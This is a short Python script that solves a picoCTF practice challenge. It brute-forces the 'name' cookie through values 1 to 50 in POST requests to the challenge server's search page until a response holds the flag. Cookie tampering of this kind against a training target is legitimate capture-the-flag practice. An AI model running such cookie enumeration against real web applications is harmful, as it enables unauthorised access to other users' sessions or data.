# https://play.picoctf.org/practice/challenge/173

import re
import requests
from tqdm import tqdm


result = None
pattern = "picoCTF{[a-zA-Z0-9_]*}"
max_iter = 50
iterator = tqdm(range(1, max_iter + 1), desc="Brute-forcing...")
for i in iterator:
    res = requests.post("http://mercury.picoctf.net:21485/search", cookies={"name": str(i)})
    result = re.findall(pattern, res.text)
    if result:
        iterator.close()
        print(result[0])
        break
